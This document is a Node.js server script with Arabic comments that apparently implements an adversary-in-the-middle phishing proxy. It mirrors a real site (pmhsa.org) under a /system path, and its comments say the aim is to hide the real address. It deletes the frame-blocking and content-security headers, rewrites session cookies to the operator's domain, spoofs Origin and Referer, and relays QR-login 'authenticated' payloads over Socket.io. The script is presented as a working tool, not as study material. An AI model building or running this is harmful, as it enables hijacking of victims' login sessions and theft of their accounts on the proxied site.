const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

// 1. ملفات الواجهة العامة ورمز الـ QR
const publicDir = path.join(__dirname, 'public');
app.use(express.static(publicDir));

// 2. محرك الوسيط الذكي (Reverse Proxy) لإخفاء الرابط الحقيقي
// كل ما يطلبه المتصفح عبر المسار /system يجلبه السيرفر من الموقع الحقيقي
const TARGET_ORIGIN = 'https://pmhsa.org';

app.use('/system', createProxyMiddleware({
  target: TARGET_ORIGIN,
  changeOrigin: true,
  secure: false,
  pathRewrite: {
    '^/system': '/web_www1', // تحويل المسار الداخلي تلقائياً
  },
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('Referer', TARGET_ORIGIN);
    proxyReq.setHeader('Origin', TARGET_ORIGIN);
  },
  onProxyRes: (proxyRes, req, res) => {
    // إزالة أي قيود أمنية لمنع إظهار الرابط أو منع الكوكيز
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    
    // تعديل كوكيز الجلسة لتتوافق تماماً مع دومين سيرفرك
    if (proxyRes.headers['set-cookie']) {
      proxyRes.headers['set-cookie'] = proxyRes.headers['set-cookie'].map(cookie => {
        return cookie.replace(/domain=[^;]+;/i, '').replace(/SameSite=None/i, 'SameSite=Lax');
      });
    }
  }
}));

// 3. إدارة جلسات الربط بالـ QR (Socket.io)
const sessionStore = new Map();

io.on('connection', (socket) => {
  socket.on('join_session', (arg) => {
    const sessionId = typeof arg === 'string' ? arg : (arg && arg.sessionId ? arg.sessionId : '');
    if (!sessionId) return;
    socket.join(sessionId);
    socket.data.sessionId = sessionId;
  });

  socket.on('register_phone', (sessionId) => {
    if (!sessionId) return;
    socket.join(sessionId);
  });

  socket.on('send_payload', ({ sessionId, payload }) => {
    if (!sessionId) return;
    io.to(sessionId).emit('authenticated', payload);
  });

  socket.on('relay_to_phone', ({ sessionId, action, data }) => {
    if (!sessionId || !action) return;
    io.to(sessionId).emit('relay_to_phone', { action, data });
  });

  socket.on('terminate_session', (sessionId) => {
    if (!sessionId) return;
    io.to(sessionId).emit('session_terminated', { sessionId });
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Relay & Reverse Proxy Server running on port ${PORT}`);
});
